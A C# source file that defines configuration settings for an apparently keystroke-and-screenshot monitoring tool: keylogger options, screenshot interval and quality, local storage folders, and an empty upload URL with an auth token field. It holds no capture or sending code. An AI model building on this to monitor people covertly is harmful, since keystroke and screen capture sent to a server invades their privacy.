using System;

namespace Common.ConfigurationManager
{
    public class ConfigurationManager
    {
        public static ConfigurationManager CurrentConfig { get; set; } = new ConfigurationManager();

        public string DataPath { get; set; } = System.IO.Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "KSDatabase");
        public KeyLoggerConf KLConfig { get; set; } = new KeyLoggerConf();
        public ScreenshotConf ScrConfig { get; set; } = new ScreenshotConf();
        public UploadConf UpConfig { get; set; } = new UploadConf();
    }

    public class KeyLoggerConf
    {
        public int KeyLoggerSessionIdle { get; set; } = 67;
        public bool KeyLoggerEnableRawEvents { get; set; } = false;
    }

    public class ScreenshotConf
    {
        public int ScreenshotInterval { get; set; } = 60;
        public int JpegQuality { get; set; } = 80;
        public string ScreenshotPath { get; set; } = System.IO.Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "KSScreenshots");
        public bool OnChangedWindow { get; set; } = true;
    }

    public class UploadConf
    {
        public string UploadUrl { get; set; } = string.Empty;
        public int SenderInterval { get; set; } = 1;
        public string AuthToken { get; set; } = string.Empty;
    }
}
